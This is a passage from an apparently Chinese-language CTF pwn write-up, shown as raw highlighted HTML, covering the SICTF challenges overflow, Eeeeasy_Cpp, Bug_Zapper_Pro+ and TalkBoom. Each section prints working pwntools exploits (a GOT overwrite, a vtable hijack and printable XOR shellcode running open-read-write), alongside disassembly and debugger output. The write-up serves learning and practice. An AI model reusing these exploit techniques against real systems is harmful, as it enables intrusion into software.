punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>检查保护，没有开<code>pie</code>和<code>canary</code>且可以溢出，且有<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  bugzapper_pro_release  checksec pwn            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn'</span>    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用点就在<code>std::string::operator</code></p><pre class="line-numbers language-none"><code class="language-none">0x40130f    mov    rsi, qword ptr [rbp - 0x60]0x401313    mov    rdi, qword ptr [rbp - 0x58]0x401317    call   std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator&#x3D;(char const*)@plt &lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator&#x3D;(char const*)@plt&gt;rdi: 0x7ffedb22ccd8 —▸ 0x404018 (__stack_chk_fail@got.plt) —▸ 0x401066 (__stack_chk_fail@plt+6) ◂— push 3rsi: 0x7ffedb22cc30 —▸ 0x4011d0 ◂— push rbprcx: 0x86c29a6f4f550100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入之后将<code>rbp - 0x60</code>里的值作为二参，<code>rbp - 0x58</code>里的值作为一参，而<code>rbp - 0x60</code>里的地址就是输入的起始地址，<code>rbp - 0x58</code>里的地址也是可以通过溢出覆盖到的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> x<span class="token operator">/</span><span class="token number">20</span>gx <span class="token number">0x7ffc18381560</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token number">0x7ffc18381500</span><span class="token operator">:</span> <span class="token number">0x00007ffc18381510</span>      <span class="token number">0x00007ffc183815b8</span><span class="token number">0x7ffc18381510</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381520</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381530</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381540</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381550</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381560</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381570</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381580</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381590</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中存在如下一条指令，此时的<code>cl</code>就是<code>rsi</code>，所以控制<code>rdi</code>为<code>stack_chk_got</code>、<code>rsi</code>为<code>backdoor</code>再覆盖掉<code>canary</code>触发<code>stack_chk_fail</code>执行<code>backdoor</code></p><pre class="line-numbers language-none"><code class="language-none">0x7ff7587a0812 &lt;__memmove_avx_unaligned_erms+82&gt;    mov    byte ptr [rdi], cl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011D0</span>stack_chk_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_chk_got<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy_Cpp"></a>Eeeeasy_Cpp</h2><p>一个<code>c++</code>程序，程序一开始会给出一个程序中的地址，存在两个堆，其中一个堆用来存储输入的<code>name</code>和<code>password</code>，其中<code>password</code>可以向下溢出，而下面一个堆存储了用于输出的函数的<code>vtable</code>地址和要输出的地址，控制这两个地址就可以控制调用<code>show</code>时执行的函数和输出内容的地址（用于泄露）</p><blockquote><p><code>C++</code>中的虚函数表（<code>vtable</code>）是一种用于实现动态多态性的机制。它是在包含虚函数的类的对象中存储的一张表，用于存储该类的虚函数的地址。虚函数表使得在运行时可以通过指针或引用来访问实际派生类的虚函数。</p></blockquote><p>本题的思路就是通过改<code>vtable</code>位置的内容为一个存储<code>backdoor</code>的地址，这里需要向堆中写入<code>backdoor</code>地址，再将<code>vtable</code>处地址改成写入了<code>backdoor</code>的堆地址，所以还需要先泄露堆地址。</p><p>由于控制输出地址的那个位置就是一个堆地址，所以泄露堆地址可以直接改输出的地址的低位指向其本身，但是在泄露地址之后再次添加会向第二个堆输入，所以还需要再次<code>add</code>复原输出的堆地址低位，这样再次输入就能正常向第一个堆输入了。</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'G'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter your name: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter your password:'</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'P'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2650</span>backdoor <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x22E0</span>vtable <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x4D38</span>add<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vtable <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x48'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">b'\x10'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug_Zapper_Pro+"></a>Bug_Zapper_Pro+</h2><p>由于存在<code>ptrace</code>，所以在长度为<code>0xb</code>的时候能调试，在长度为<code>0x10</code>的时候能执行但不能调试，题目限制了<code>shellcode</code>的长度在<code>0x10</code>之内并且是可见字符</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token number">85</span><span class="token punctuation">;</span>    __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_creat <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x114514FE0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v4 <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v6 <span class="token operator">&lt;</span> <span class="token number">0x20</span> <span class="token operator">||</span> <span class="token operator">*</span>v6 <span class="token operator">>=</span> <span class="token number">0x7E</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> end<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      MEMORY<span class="token punctuation">[</span><span class="token number">0x114514FE0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路还是先写<code>shellcode</code>再次执行<code>read</code>，程序中跳转后的起始地址在<code>0x114514FE0</code>，但是<code>rwx</code>段到<code>0x114515000</code>结束，中间长度不够，所以再次读的时候还要向上转移</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x400000           0x401000 r--p     <span class="token number">1000</span>      <span class="token number">0</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn          0x401000           0x402000 r-xp     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn          0x402000           0x403000 rw-p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn       0x114514000        0x114515000 rwxp     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_114514<span class="token punctuation">]</span>    0x7ffff7ff9000     0x7ffff7ffd000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    0x7ffff7ffd000     0x7ffff7fff000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    0x7ffffffde000     0x7ffffffff000 rw-p    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>0xffffffffff600000 0xffffffffff601000 <span class="token parameter variable">--xp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见字符最大的问题就是不能写入<code>syscall</code>，所以可以通过先向需要执行<code>syscall</code>的地方向写入可见字符再和某个位置异或间接的得到<code>syscall</code>，异或需要用到<code>rax + address</code>，而<code>shellcode</code>每一位都要大于<code>0x20</code>，所以先<code>rax</code>减去一部分，减去的这个值需要满足：低两位与<code>syscall</code>异或的值是可见字符、其本身也是可见字符，最终我选择了<code>- 0x67</code>,最终<code>rax</code>的低位是<code>0x4f79</code>，与<code>syscall</code>异或之后<code>&gt;&gt;&gt; hex(0x4f79 ^ 0x050f) = 0x4a76</code>,所以在<code>shellcode</code>末尾写<code>0x4a76</code>,异或后即可得到<code>syscall</code></p><p>其中读入的地址我选择了<code>rax - 0x67</code>，这样可以读入的长度会更长一些，再次读入的<code>shellcode</code>需要控制第一次读入的地址的下一个命令<code>jmp rsi</code>，最后执行<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''sub al, 0x67push raxpop rsixor word ptr [rax + 0x72], axpop rdxpush rbxpop rax.word 0x4a76'''</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x20'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Welcome'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rax,0x67616c66push raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''jmp rsi'''</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TalkBoom"><a href="#TalkBoom" class="headerlink" title="TalkBoom"></a>TalkBoom</h2><p><code>rust</code>写的程序，没开<code>canary</code>和<code>pie</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  talk  checksec pwn     <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game2024/sictf_r3/talk/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会将输入的字符串和很多字符串进行比较</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:000000000040504D 48 8D 35 AC 31 04 00          lea     rsi, unk_448200                 ; s2.text:0000000000405054 BA 40 00 00 00                mov     edx, 40h ; &#39;@&#39;                  ; n.text:0000000000405059 4C 89 F7                      mov     rdi, r14                        ; s1.text:000000000040505C FF 15 5E AC 05 00             call    cs:bcmp_ptr.text:000000000040505C.text:0000000000405062 85 C0                         test    eax, eax.text:0000000000405064 0F 84 E0 04 00 00             jz      loc_40554A.text:0000000000405064.text:000000000040506A 48 8D 35 CF 31 04 00          lea     rsi, unk_448240                 ; s2.text:0000000000405071 BA 40 00 00 00                mov     edx, 40h ; &#39;@&#39;                  ; n.text:0000000000405076 4C 89 F7                      mov     rdi, r14                        ; s1.text:0000000000405079 FF 15 41 AC 05 00             call    cs:bcmp_ptr.text:0000000000405079.text:000000000040507F 85 C0                         test    eax, eax.text:0000000000405081 0F 84 FE 04 00 00             jz      loc_405585.text:0000000000405081...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较之后跳转，跳转之后有一个<code>mov edi</code>，在<code>mov edi, 100h</code>的那个分值会跳转到一个存在栈溢出的<code>read</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000405585 48 8D 05 FC 79 05 00          lea     rax, off_45CF88.text:000000000040558C 48 89 04 24                   mov     [rsp+68h+s1], rax               ; args.text:0000000000405590 48 C7 44 24 08 01 00 00 00    mov     [rsp+68h+size], 1.text:0000000000405599 48 8D 05 28 32 04 00          lea     rax, unk_4487C8.text:00000000004055A0 48 89 44 24 10                mov     [rsp+68h+size+8], rax.text:00000000004055A5 0F 57 C0                      xorps   xmm0, xmm0.text:00000000004055A8 0F 11 44 24 18                movups  [rsp+68h+var_50], xmm0.text:00000000004055AD 48 89 E7                      mov     rdi, rsp.text:00000000004055B0 FF 15 4A A6 05 00             call    cs:_ZN3std2io5stdio6_print17h8c9d4123cf4200e3E_ptr ; std::io::stdio::_print::h8c9d4123cf4200e3.text:00000000004055B0.text:00000000004055B6.text:00000000004055B6                               loc_4055B6:                             ; CODE XREF: SphinxBomb::main::hb23b3d8accd9981a+81C↓j.text:00000000004055B6 BF 17 00 00 00                mov     edi, 17h.text:00000000004055BB E9 A4 00 00 00                jmp     loc_405664.text:00000000004055BB.text:00000000004055C0                               ; ---------------------------------------------------------------------------.text:00000000004055C0.text:00000000004055C0                               loc_4055C0:                             ; CODE XREF: SphinxBomb::main::hb23b3d8accd9981a+1FE↑j.text:00000000004055C0 48 8D 05 B1 79 05 00          lea     rax, off_45CF78.text:00000000004055C7 48 89 04 24                   mov     [rsp+68h+s1], rax               ; args.text:00000000004055CB 48 C7 44 24 08 01 00 00 00    mov     [rsp+68h+size], 1.text:00000000004055D4 48 8D 05 ED 31 04 00          lea     rax, unk_4487C8.text:00000000004055DB 48 89 44 24 10                mov     [rsp+68h+size+8], rax.text:00000000004055E0 0F 57 C0                      xorps   xmm0, xmm0.text:00000000004055E3 0F 11 44 24 18                movups  [rsp+68h+var_50], xmm0.text:00000000004055E8 48 89 E7                      mov     rdi, rsp.text:00000000004055EB FF 15 0F A6 05 00             call    cs:_ZN3std2io5stdio6_print17h8c9d4123cf4200e3E_ptr ; std::io::stdio::_print::h8c9d4123cf4200e3.text:00000000004055EB.text:00000000004055F1 BF 2E 00 00 00                mov     edi, 2Eh ; &#39;.&#39;.text:00000000004055F6 EB 6C                         jmp     short loc_405664.text:00000000004055F6.text:00000000004055F8                               ; ---------------------------------------------------------------------------.text:00000000004055F8...<span aria-hidden="true" 